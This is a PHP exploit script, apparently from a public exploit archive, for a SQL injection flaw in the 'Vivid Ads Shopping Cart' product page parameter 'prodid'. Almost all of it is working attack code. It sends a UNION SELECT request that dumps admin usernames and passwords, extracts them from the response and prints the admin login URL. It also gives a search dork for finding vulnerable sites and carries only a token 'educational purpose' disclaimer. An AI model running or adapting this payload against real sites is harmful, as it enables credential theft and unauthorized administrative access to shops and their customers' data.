<?php
# Vivid Ads Shopping Cart (prodid) Remote SQL Injection
# Author: Pr0T3cT10n, pr0t3ct10n[at]gmail[dot]com
# This code was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
# Dork: "Vivid Ads Shopping Cart"
# nullbyte.org.il

$site = 'www.example.com'; # Site address
$path = '/path'; # Folder path
$contents = '';
$sock = fsockopen($site, 80, $errno, $errstr, 30);
if(!$sock){
    echo('( ' .$errstr.$errno. ' )'."\n");
}
else{
    $pack = "GET " .$path. "/detail.php?prodid=-1+union+select+1,2,3,concat(char(60),login,char(59),password,char(62)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+admin HTTP/1.1\r\n";
    $pack.= "Host: " .$site. "\r\n";
    $pack.= "Connection: Close\r\n\r\n";
    if(fwrite($sock, $pack)){
        while(!feof($sock)){
            $contents.= fgets($sock, 4096);
        }
        if(preg_match('/<(.*);(.*)>/', $contents, $matches)){
            echo('User: ' .$matches[1]. ';'."\n".'Pass: ' .$matches[2]. ';'."\n".'Admin login: http://' .$site.$path. '/admin/'."\n");
        }
        else{
            echo('Can\'t pull out admin details.'."\n");
        }
    }
    else{
        echo('Can\'t write socket.'."\n");
    }
}
?>